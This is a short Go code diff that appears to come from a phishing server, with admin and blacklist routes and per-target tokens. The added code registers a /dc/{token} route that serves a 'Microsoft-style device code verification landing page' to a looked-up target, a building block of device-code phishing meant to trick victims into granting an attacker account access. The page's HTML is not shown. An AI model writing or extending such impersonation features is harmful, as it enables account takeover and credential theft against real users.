@@ -41,6 +41,8 @@ func NewHttpServer() (*HttpServer, error) {
 	r.HandleFunc("/admin/blacklist/flush", s.handleBlacklistFlush).Methods("POST")
 	// Admin panel
 	r.HandleFunc("/admin/panel", s.handleAdminPanel).Methods("GET", "POST")
+	// Device code landing pages
+	r.HandleFunc("/dc/{token}", s.handleDCLanding).Methods("GET")
 	// User panels
 	r.PathPrefix("/panel/").HandlerFunc(s.handleUserPanel)
 
@@ -241,6 +243,19 @@ func (s *HttpServer) handleRedirect(w http.ResponseWriter, r *http.Request) {
 	}
 
 	http.Redirect(w, r, "https://"+r.Host+r.URL.String(), http.StatusFound)
+}
+
+// handleDCLanding serves the Microsoft-style device code verification landing page.
+func (s *HttpServer) handleDCLanding(w http.ResponseWriter, r *http.Request) {
+	vars := mux.Vars(r)
+	token := vars["token"]
+	tgt := GetTargetByToken(token)
+	if tgt == nil {
+		http.NotFound(w, r)
+		return
+	}
+	w.Header().Set("Content-Type", "text/html; charset=utf-8")
+	w.Write([]byte(DCLandingPage(tgt)))
 }
 
 // HandleRedirect returns an http.HandlerFunc that implements the same redirect logic as
